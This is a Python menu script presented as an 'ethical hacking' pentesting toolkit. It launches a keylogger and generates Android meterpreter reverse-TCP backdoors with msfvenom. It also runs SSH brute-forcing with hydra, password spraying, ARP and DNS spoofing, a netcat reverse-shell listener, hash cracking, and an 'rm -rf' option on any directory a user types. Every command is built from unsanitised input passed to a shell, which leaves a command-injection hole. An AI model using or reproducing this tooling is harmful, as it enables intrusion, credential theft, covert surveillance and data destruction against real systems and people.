import sys
import os
import subprocess
import logging

# Configure logging
logging.basicConfig(filename='pentest_toolkit.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def banner():
    print(r"""
            ______            _     _                     
            | ___ \          (_)   | |                    
            | |_/ /__ _ _   _ _ ___| |__  _ __   ___ _ __ 
            |    // _` | | | | / __| '_ \| '_ \ / _ \ '__|
            | |\ \ (_| | |_| | \__ \ | | | |_) |  __/ |   
            \_| \_\__,_|\__, |_|___/_| |_| .__/ \___|_|   
                        __/ |           | |              
                        |___/            |_|              

    +------------------------------------------------------+
    |           Welcome to the Rayishper Pentesting        |
    |                    Toolkit v1.0                      |
    |      Unleash the Power of Ethical Hacking            |
    +------------------------------------------------------+
    """)

def check_tool(tool_name):
    """Check if a tool is installed."""
    try:
        subprocess.run([tool_name, '--version'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
    except subprocess.CalledProcessError:
        print(f"Error: {tool_name} is not installed or not found in PATH.")
        logging.error(f"{tool_name} is not installed or not found in PATH.")
        return False
    return True

def scan_wifi():
    """Scan for available WiFi networks."""
    if not check_tool('airmon-ng') or not check_tool('airodump-ng'):
        return

    try:
        print("\nStarting WiFi scan...")
        os.system('sudo airmon-ng check kill')
        os.system('sudo airmon-ng start wlan0')
        os.system('sudo airodump-ng wlan0mon')
    except Exception as e:
        print(f"An error occurred while scanning WiFi networks: {e}")
        logging.error(f"An error occurred while scanning WiFi networks: {e}")

def execute_command(command):
    """Execute a system command and log output."""
    try:
        result = subprocess.run(command, shell=True, check=True, text=True, capture_output=True)
        print(result.stdout)
        logging.info(f"Executed command: {command}")
    except subprocess.CalledProcessError as e:
        print(f"Error executing command: {e}")
        logging.error(f"Error executing command: {e}")

def main_menu():
    """Display the main menu and handle user choices."""
    while True:
        print("\n")
        print("[1] Hack VF685")
        print("[2] View Command list")
        print("[3] Deploy a keylogger")
        print("[4] Create a payload")
        print("[5] Hack available Wifi networks")
        print("[6] Brute-force SSH login")
        print("[7] Port Scanning")
        print("[8] Launch Social Engineering Toolkit (SET)")
        print("[9] Start Packet Sniffing")
        print("[10] Crack Hashes with John the Ripper")
        print("[11] Password Spraying")
        print("[12] ARP Spoofing")
        print("[13] Reverse Shell Listener")
        print("[14] DNS Spoofing")
        print("[15] Display File Contents")
        print("[16] Delete Directory")
        print("[17] Exit")
        print("\n")

        choice = input("rayishper > ").strip()

        if choice == "1":
            execute_command('python3 VF685.py')
        elif choice == "2":
            execute_command('cat "wordlist commands"')
        elif choice == "3":
            print("+---------------------------------------+")
            print("| Keylogger is running | ctrl+c to stop |")
            print("+---------------------------------------+")
            execute_command('python3 keylog.py')
            print("______________(Logged keys)______________")
            execute_command('cat log.txt')
        elif choice == "4":
            lport = input("Listening port -> ").strip()
            lhost = input("Listening host -> ").strip()
            location = input("Absolute location -> ").strip()
            Backdoor_name = input("Backdoor name -> ").strip()
            execute_command(f'msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} R> {location}/{Backdoor_name}')
        elif choice == "5":
            scan_wifi()
        elif choice == "6":
            target_ip = input("Target IP: ").strip()
            username = input("Username: ").strip()
            wordlist = input("Path to wordlist: ").strip()
            execute_command(f'hydra -l {username} -P {wordlist} ssh://{target_ip}')
        elif choice == "7":
            target_ip = input("Target IP: ").strip()
            execute_command(f'nmap -sV {target_ip}')
        elif choice == "8":
            execute_command('sudo setoolkit')
        elif choice == "9":
            interface = input("Enter network interface: ").strip()
            execute_command(f'sudo tcpdump -i {interface}')
        elif choice == "10":
            hash_file = input("Path to hash file: ").strip()
            execute_command(f'john {hash_file}')
        elif choice == "11":
            url = input("Target URL: ").strip()
            username = input("Username: ").strip()
            wordlist = input("Path to wordlist: ").strip()
            execute_command(f'patator http_fuzz method=POST url={url} body="username={username}&password=FILE0" 0={wordlist} -x ignore:fgrep="Login failed"')
        elif choice == "12":
            target_ip = input("Target IP: ").strip()
            gateway_ip = input("Gateway IP: ").strip()
            execute_command(f'sudo arpspoof -i eth0 -t {target_ip} -r {gateway_ip}')
        elif choice == "13":
            lport = input("Listening port -> ").strip()
            execute_command(f'nc -lvnp {lport}')
        elif choice == "14":
            execute_command('sudo dnsspoof')
        elif choice == "15":
            filepath = input("Enter the file path: ").strip()
            execute_command(f'cat {filepath}')
        elif choice == "16":
            directory = input("Enter the directory: ").strip()
            execute_command(f'rm -rf {directory}')
        elif choice == "17" or choice == "exit":
            print("Exiting and cleaning up...")
            logging.info("Exiting and cleaning up...")
            break
        else:
            print("Invalid option. Please try again.")
            logging.warning(f"Invalid menu option selected: {choice}")

def login():
    """Prompt for password and start the main menu if correct."""
    banner()
    while True:
        password = input("Hello Neo, what's the magic word? ").strip()
        if password == "red pill":
            main_menu()
            break
        else:
            print("Incorrect password. Try again.")
            logging.warning("Incorrect password attempt.")

login()
